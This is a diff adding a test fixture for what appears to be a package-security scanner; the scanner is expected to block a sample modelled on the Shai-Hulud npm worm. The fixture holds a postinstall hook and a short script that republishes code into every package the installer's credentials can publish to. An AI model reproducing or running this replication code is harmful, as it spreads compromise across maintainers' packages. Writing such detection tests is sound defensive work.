@@ -1,0 +1,13 @@
+{
+  "name": "shai-hulud-registry-self-publish",
+  "expect": "block",
+  "expectFinding": "registry-self-publish",
+  "note": "modeled on the Shai-Hulud worm's replication loop (2025-26): a postinstall hook asks the registry which packages the stolen credentials can publish to, then republishes itself into each one. This is what turned a single compromised maintainer account into 796 compromised packages.",
+  "evidence": {
+    "packageName": "some-string-util",
+    "sourceFiles": {
+      "package.json": "{\"name\":\"some-string-util\",\"version\":\"2.0.4\",\"repository\":\"https://github.com/some-string-util/some-string-util\",\"scripts\":{\"postinstall\":\"node propagate.js\"}}",
+      "propagate.js": "const cp=require('child_process');\nconst owned=JSON.parse(cp.execSync('npm access list packages --json').toString());\nfor(const name of Object.keys(owned)){\n  cp.execSync('npm publish --access public',{cwd:'/tmp/staged/'+name});\n}"
+    }
+  }
+}
